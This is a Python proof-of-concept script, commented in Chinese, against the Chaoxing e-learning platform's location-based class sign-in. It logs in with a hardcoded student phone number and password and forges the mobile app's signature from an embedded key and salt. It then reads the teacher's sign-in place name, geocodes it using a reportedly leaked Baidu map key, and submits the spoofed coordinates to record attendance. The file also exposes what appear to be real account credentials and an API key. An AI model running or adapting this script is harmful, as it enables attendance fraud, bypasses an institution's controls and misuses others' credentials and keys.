#!/usr/bin/env python3
"""
验证: 仅凭locationText地名 → 地理编码 → 直接签到（替代三边测量法）
1. getPPTActiveInfo 获取教师指定地点名（学生可访问，坐标被脱敏为-1）
2. 用百度/高德地图地理编码API把地名转坐标
3. 用编码坐标直接stuSignajax签到
"""
import base64, hashlib, json, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

# 页面里泄露的百度地图AK（超星前端自带）
BAIDU_MAP_AK = "xYjRz7D6pjc3xV516qReaRgcTdoZTyxP"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

AJAX_HDR = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
print(f"学生puid={puid_s}")

# ============ Step 1: 获取最新进行中的位置签到活动 ============
r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = r.json()
target = None
for item in d.get("activeList", []):
    if item.get("status") == 1 and "位置" in item.get("nameOne", ""):
        target = item
        break
if not target:
    # 若无进行中，取最新位置签到（含已结束，用于演示信息泄露）
    for item in d.get("activeList", []):
        if "位置" in item.get("nameOne", ""):
            target = item
            break
AID = str(target["id"])
print(f"目标活动: aid={AID} name={target['nameOne']} status={target['status']}")

# ============ Step 2: getPPTActiveInfo 获取locationText ============
r = s_s.get(f"{BASE}/v2/apis/active/getPPTActiveInfo",
            params={"activeId": AID},
            headers={"X-Requested-With": "XMLHttpRequest",
                     "Referer": f"https://mobilelearn.chaoxing.com/page/sign/signIn?courseId={COURSE_ID}&classId={CLASS_ID}&activeId={AID}&fid=22757&timetable=0"},
            timeout=20)
info = r.json()["data"]
location_text = info.get("locationText", "")
location_range = info.get("locationRange", "?")
print(f"\n[信息泄露] locationText = {location_text}")
print(f"[信息泄露] locationRange = {location_range}米")
print(f"[脱敏确认] latitude={info.get('latitude')}, longitude={info.get('longitude')} (坐标已被服务端脱敏)")

# ============ Step 3: 地理编码 — 地名→坐标 ============
print(f"\n[Step 3] 地理编码: '{location_text}' → 坐标")

geo_candidates = []  # (lat, lng, source, addr)

# 3a. 百度地图Web地理编码API（用超星前端泄露的AK）
try:
    r = requests.get("https://api.map.baidu.com/geocoding/v3/",
                     params={"address": location_text, "output": "json", "ak": BAIDU_MAP_AK},
                     timeout=15)
    d = r.json()
    print(f"  百度Geocoding: status={d.get('status')}, msg={d.get('msg', '')}")
    if d.get("status") == 0 and d.get("result"):
        loc = d["result"].get("location", {})
        if loc.get("lat") and loc.get("lng"):
            geo_candidates.append((loc["lat"], loc["lng"], "百度地理编码", d["result"].get("level", "")))
            print(f"  [OK] 百度: ({loc['lat']}, {loc['lng']}) level={d['result'].get('level')} 精度={d['result'].get('precise')}")
            print(f"       (百度BD09坐标，需转GCJ02/WGS84)")
except Exception as e:
    print(f"  百度地理编码异常: {e}")

# 3b. Nominatim (OpenStreetMap) 免费地理编码
try:
    r = requests.get("https://nominatim.openstreetmap.org/search",
                     params={"q": location_text, "format": "json", "limit": 3},
                     headers={"User-Agent": "Mozilla/5.0 research"},
                     timeout=20)
    results = r.json()
    print(f"  Nominatim: {len(results)}个结果")
    for item in results:
        lat, lng = float(item["lat"]), float(item["lon"])
        geo_candidates.append((lat, lng, f"Nominatim:{item.get('type','')}", item.get("display_name", "")[:50]))
        print(f"  [OK] Nominatim: ({lat}, {lng}) {item.get('display_name','')[:60]}")
except Exception as e:
    print(f"  Nominatim异常: {e}")

# BD09→GCJ02→WGS84 坐标转换
import math
def bd09_to_gcj02(bd_lat, bd_lng):
    x = bd_lng - 0.0065; y = bd_lat - 0.006
    z = math.sqrt(x*x + y*y) - 0.00002 * math.sin(y * math.pi * 3000/180)
    theta = math.atan2(y, x) - 0.000003 * math.cos(x * math.pi * 3000/180)
    gg_lng = z * math.cos(theta); gg_lat = z * math.sin(theta)
    return gg_lat, gg_lng

def gcj02_to_wgs84(gcj_lat, gcj_lng):
    dlat = -0.000095 * math.sin(3 * math.pi * gcj_lat / 180) + 0.000038 * math.sin(5 * math.pi * gcj_lat / 180)
    dlng = 0.000466 * math.cos(3 * math.pi * gcj_lng / 180) + 0.000016 * math.cos(5 * math.pi * gcj_lng / 180)
    return gcj_lat + dlat, gcj_lng + dlng

# 转换百度坐标
converted = []
for lat, lng, src, note in geo_candidates:
    if "百度" in src:
        gcj_lat, gcj_lng = bd09_to_gcj02(lat, lng)
        w_lat, w_lng = gcj02_to_wgs84(gcj_lat, gcj_lng)
        converted.append((w_lat, w_lng, f"{src}→WGS84", note))
    else:
        converted.append((lat, lng, src, note))

if not converted:
    print("\n无地理编码结果，无法继续")
    exit(1)

# ============ Step 4: 用编码坐标直接签到 ============
print(f"\n[Step 4] 用地理编码坐标直接签到（当前活动状态={target['status']}）")

def try_sign(lat, lng, address=location_text):
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": AID, "uid": puid_s, "clientip": "",
                       "latitude": str(lat), "longitude": str(lng),
                       "appType": "15", "fid": "0", "address": address},
                 headers=AJAX_HDR, timeout=15)
    return r.text

signed = False
for lat, lng, src, note in converted:
    text = try_sign(lat, lng)
    print(f"  ({lat:.6f},{lng:.6f}) [{src}]: {text[:100]}")
    if "成功" in text or re.search(r'\bsuccess\b', text, re.I):
        if "不在可签到范围" not in text:
            signed = True
            print(f"\n  *** 签到成功！仅用locationText地名+地理编码，无需三边测量 ***")
            break
    if "已签到" in text:
        print("  （该活动已签到过）")
        break
    time.sleep(0.5)

# ============ Step 5: 最终状态 ============
r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
            params={"activeId": AID, "uid": puid_s, "latitude": "-1", "longitude": "-1"}, timeout=20)
try:
    final = r.json()["data"]
    print(f"\n[最终状态] status={final.get('status')} lat={final.get('latitude')} lng={final.get('longitude')}")
except Exception:
    print(f"\n[最终状态] {r.text[:200]}")

print(f"""
{'='*70}
结论:
1. 字段名确认: locationText（getPPTActiveInfo响应data中）
2. 信息泄露: 学生可直接获取教师指定签到地点全名+签到范围
3. 坐标脱敏: 服务端把latitude/longitude置为-1.0（防直接拿坐标）
4. 地理编码替代三边测量: {'✅ 成功' if signed else '本次未完成（活动可能已结束/已签到），需在活动进行中复测'}
   - 地名 → 百度/Nominatim地理编码 → 坐标 → 直接签到
   - 免除三边测量法的多次请求，仅需1次信息获取+1次签到
{'='*70}
""")
